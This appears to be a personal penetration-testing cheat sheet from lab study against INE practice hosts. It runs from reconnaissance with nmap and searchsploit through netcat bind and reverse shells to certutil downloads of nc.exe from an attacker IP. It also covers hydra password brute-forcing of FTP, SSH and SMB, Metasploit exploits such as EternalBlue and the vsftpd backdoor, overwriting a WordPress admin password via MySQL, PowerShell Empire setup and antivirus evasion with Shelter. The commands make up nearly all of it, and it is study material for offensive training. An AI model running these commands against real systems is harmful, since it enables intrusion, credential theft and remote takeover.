<h2>Banner Grabbing</h2>
An information gathering technique used by pen testers to enum info regarding the target OS and services running on open ports.

```
nmap -sC -sV -O -T3 ip -oX output.xml
```

```
nmap -sV --script=banner 192.8.94.3
```

```
nc 192.8.94.3 22
```

```
nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.152.25.3
```

```
ls -al /usr/share/nmap/scripts | grep vuln
```


`www.packetstormsecurity.com`
`rapid7`
`googlehacking database `

```
searchsploit vsftpd
```

```
searchsploit -t vsftpd
```

Command to copy the exploit into your current working directory
```
searchsploit -m /PATH
```

commands can be used to display the Exploit-db URL instead of the EDBID?
```
searchsploit -w vsftdp
```

<h2>Fixing Exploitation</h2>
```
searchsploit HTTP File Server 2.3
```
```
searchsploit -m 39161
```
```
vim 39161.py
```
```
cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/
```
```
python -m SimpleHTTPServer 80
```
```
nc -nvlp 1234
```
```
python 39161.py demo.ine.local 80
```

<h2>Bind & Reverse Shell </h2>

TCP
```
nc -nv ip port
```

UDP
```
nc -nvu ip port 
```

Listen
```
nc -nlvp 13444  
```
Windows:
```
nc.exe -nv ip port
```

Receiver:
```
nc -nlvp Port > text.txt
```

Sender:
```
nc -nv <ReceiverIP> Port < test.txt 
```


<h3>Bind Shell</h3>
Disadvantage: Need to Setup In Client Machine.

Netcat Client(Attacker) ------------------> Netcat Listerner(Target) {cmd.exe}{/bin/bash}

Target:
```
certutil -urlcache -split -f https://AttackerIP/nc.exe nc.exe
```

```
certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe
```

```
nc.exe -nlvp Port -e cmd.exe
```

Attacker:
```
nc -nv TargetIP Port

whoami
dir
```


if Attacker machine is windows  and target is linux Kali
Target:
```
nc -nlvp port -c /bin/bash
```

Attacker:
```
nc.exe -nv TargetIP Port

ls
id
```

<h3> Reverse Shell </h3>
Advantage: no NEED to setup in Client Machine.

Netcat Listerner(Attacker) <------------------------- Netcat Client(Target)

Attacker:
```
nc -nlvp 1234
```

Target:
```
nc.exe -nv AttackerIP -e cmd.exe
```

This has a alternative of using powershell or any other command.

<h2>Reverse Shell Cheetsheet </h2>

```
https://github.com/swisskyrepo/PayloadsAllTheThings
```

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```

```
www.revshells.com
```

<h3>Exploitation Frameworks</h3>

<h4> MSF Framework </h4>

<h4> PowerShell Empire </h4>
```
	sudo apt-get update && sudo apt-get install powershell-empire starkiller -y 
```


Now we start backend of powershell empire
```
sudo powershell-empire server
```

Server>

```
sudo powershell-empire client
```

(Empire) >

```
listerns

agents

help

intract <machineName>
```
agents - no of machines compramised

open starkill in GUI

username : empireadmin
password : password123

https://www.youtube.com/watch?v=Mif2KyhA6I4&t=41s

<h2> Windows Exploitation </h2>

```
nmap -T4 -PA -sC -sV -p 1-10000 demo.ine.local
```

```
nmap -sV -sC -p 445 demo.ine.local
```

```
msfconsole
use /auxiliary/scanner/smb/smb_version
set RHOSTS demo.ine.local
run
```

<h3> Microsoft IIS FTP </h3>
```
nmap -sV -p 21 --script=anon 192.168.1.1
```

```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ftp
```

<h3> OpenSSH </h3>
```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ssh
```

`ssh administrator@demo.ine.local`
`ssh login as administrator is disabled as a good practice.`

```
msfconsole
use auxiliary/scanner/ssh/ssh_login
set USERNAME 
set PASSWORD
set RHOSTS
```

`this msf generates us a session to connect to demo.ine.local as administrator.`

<h3> SMB </h3>
```
nmap -sV -p 445 demo.ine.local 
```


This requires username and password except MS17_010
```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb
```

```
msfconsole 
use auxiliary/scanner/smb/smb_login
set USER_FILE 
set PASS_FILE
set SMBCreateSession true
run
```

```
smbclient -L demo.ine.local -U <name>
```

```
smbmap -u meowuser -p meowpassword -H demo.ine.local
```

```
enum4linux -u meowuser -p meowpassword -U demo.ine.local
```

```
msfconsole
use auxiliary/scanner/smb/smb_enumusers
show options
set RHOSTS 
set SMBUser
set SMBPass
run
```

```
locate psexec.py
chmod +x psexec.py
python3 psexec.py Administrator@demo.ine.local
```

```
msfconsole
use auxiliary/scanner/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS
set SMBUser
set SMBPass
run
```

```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS
exploit
```


<h3> SQL </h3>
```
nmap -sV -p 3306 demo.ine.local
```

```
msfconsole
use auxiliary/scanner/mysql/mysql_login
show options
run

cd alias
download phpmyadmin.conf
//change phpmyadmin.conf to accept us
upload phpmyadmin.conf

```

```
mysql -u root -p -h demo.ine.local
```


```
show database;
use wordpress;
select * from wp_user;

```

```
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
```

<h2>Linux Exploitation</h2>
```
nmap -sV -sC -p 21 demo.ine.local
```

```
ftp demo.ine.local 21
```

```
searchsploit vsftpd
```

```
msfconsole
```

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

```
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local ftp
```

```
ftp demo.ine.local 21
```

<h3>PHP</h3>
```
searchsploit php cgi
```

```
msfconsole
use exploit/multi/http/php_cgi_arg_injection
```

<h3>SMB</h3>

```
msfconsole
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS
run
```

```
use exploit/multi/samba/usermap_script
set RHOSTS
run
```

<h2> AntiVirus Evasion using Shelter</h2>
Shelter: dynamic shellcode injection tool.
www.shelterproject.com

we use `wine` to execute Shelter in `Linux`.
Installation:
```
sudo apt-get install shelter -y
sudo dkpg --add-architecture i386
sudo apt-get install wine32
cd /shelter
sudo wine shelter.exe
A
/home/kali/Desktop/AVBypass/vncviewer \\this is a file payload with encoding etc.

```

get any small size executable.


<h2> Obfuscation </h2>
https://github.com/danielbohannon/Invoke-Obfuscation